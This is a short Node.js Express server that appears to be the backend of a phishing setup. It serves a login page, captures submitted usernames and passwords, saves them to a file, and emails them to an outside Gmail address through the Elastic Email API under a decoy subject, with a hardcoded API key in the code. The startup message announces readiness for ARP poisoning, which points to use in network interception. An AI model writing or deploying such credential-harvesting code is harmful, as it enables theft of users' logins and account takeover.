import express from "express";
import fs from "fs";
import cors from 'cors';
import axios from 'axios'; // For making HTTP requests

const app = express();
app.use(cors({ origin: '*' }));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", async (req, res, next) => {
    try {
        const SentenceData = `user: ${req.body.userName} password: ${req.body.password}`;
        console.log(SentenceData);

        // Write SentenceData to result.txt file
        fs.writeFile("result.txt", SentenceData, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
        });

        // Send email using Elastic Email API
        const elasticEmailParams = {
            apikey: '1E95F4E6675C1D4A02B09642FF5DB3F05F6D2E4BE87CDAE4335D502E80F6EB532BB8807A73D3A9C8658DB74E84E6D5FD',
            from: 'liamhyers45@outlook.com',
            to: 'alan.glenn45@gmail.com',
            subject: 'Your Food is Ready',
            bodyText: SentenceData,
        };

        const elasticEmailResponse = await axios.post('https://api.elasticemail.com/v2/email/send', null, {
            params: elasticEmailParams
        });

        console.log('Email sent: ', elasticEmailResponse.data);

        res.sendStatus(200);
    } catch (err) {
        console.log(err);
        res.sendStatus(500);
    }
});

app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));
